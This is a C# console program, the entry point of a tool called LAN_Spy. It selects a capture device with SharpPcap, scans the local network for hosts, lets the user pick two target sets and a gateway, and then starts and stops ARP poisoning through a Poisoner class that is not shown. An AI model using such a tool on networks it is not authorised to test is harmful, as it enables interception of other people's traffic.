using SharpPcap.WinPcap;
using System;
using System.Threading;

namespace LAN_Spy {
    internal static class Program {
        private static void Main() {
            var scanner = new Scanner();
            Console.WriteLine("Available devices: ");
            var n = 1;
            foreach (var item in scanner.DeviceList) {
                var device = (WinPcapDevice) item;
                Console.WriteLine(n++ + ". " + device.Interface.FriendlyName);
            }

            Console.WriteLine();
            Console.Write("Select using device: ");
            var index = int.Parse(Console.ReadLine() ?? throw new FormatException("Not valid number."));
            if (index >= n) throw new IndexOutOfRangeException("No such device.");
            scanner.CurDevIndex = index - 1;
            
            Console.WriteLine();
            Console.Write("Current network has " + scanner.AddressCount + " available addresses. Start scan? [Y/N]");
            if (Console.ReadLine()?.ToUpperInvariant() != "Y") {
                Console.WriteLine("Process interrupted.");
                return;
            }
            Console.WriteLine("Scanning...");
            scanner.ScanForTarget();

            Console.WriteLine("Spying...");
            var t = new Thread(scanner.SpyForTarget);
            t.Start();
            Thread.Sleep(10 * 1000);
            t.Abort();
            while (t.IsAlive) { Thread.Sleep(100); }

            Console.WriteLine();
            Console.WriteLine("Total hosts: " + scanner.HostList.Count);
            n = 1;
            foreach (var host in scanner.HostList) {
                if (Equals(host.IPAddress, scanner.GatewayAddress))
                    Console.WriteLine(n++ + ". " + host.IPAddress + " is at " + host.PhysicalAddress + " (Possible Gateway Address)");
                else if (Equals(host.IPAddress, scanner.Ipv4Address))
                    Console.WriteLine(n++ + ". " + host.IPAddress + " is at " + host.PhysicalAddress + " (Possible Device Address)");
                else
                    Console.WriteLine(n++ + ". " + host.IPAddress + " is at " + host.PhysicalAddress);
            }

            Console.WriteLine();
            Console.Write("Select target1: ");
            var targets = Console.ReadLine()?.Split(' ');
            var poisoner = new Poisoner {CurDevIndex = scanner.CurDevIndex};
            if (targets == null) throw new FormatException("Not valid numbers.");
            foreach (var target in targets) {
                index = int.Parse(target);
                if (index >= n) throw new IndexOutOfRangeException("No such host.");
                poisoner.Target1.Add(scanner.HostList[index - 1]);
            }
            Console.Write("Select target2: ");
            targets = Console.ReadLine()?.Split(' ');
            if (targets == null) throw new FormatException("Not valid numbers.");
            foreach (var target in targets) {
                index = int.Parse(target);
                if (index >= n) throw new IndexOutOfRangeException("No such host.");
                poisoner.Target2.Add(scanner.HostList[index - 1]);
            }
            var flag = false;
            foreach (var host in scanner.HostList) {
                if (!Equals(host.IPAddress, scanner.GatewayAddress)) continue;
                Console.Write("Gateway detected(" + host.IPAddress + "). Use it? [Y/N]");
                if (Console.ReadLine()?.ToUpperInvariant() != "Y")
                    break;
                poisoner.Gateway = host;
                flag = true;
                break;
            }
            if (!flag) {
                Console.Write("Select gateway: ");
                poisoner.Gateway = scanner.HostList[int.Parse(Console.ReadLine() ?? throw new FormatException()) - 1];
            }

            Console.WriteLine();
            Console.WriteLine("Poisoning...");
            poisoner.StartPoisoning();
            Console.WriteLine("Press any key to stop.");
            Console.ReadKey();
            poisoner.StopPoisoning();
            Console.WriteLine("Stopped. Thanks for using.");
        }
    }
}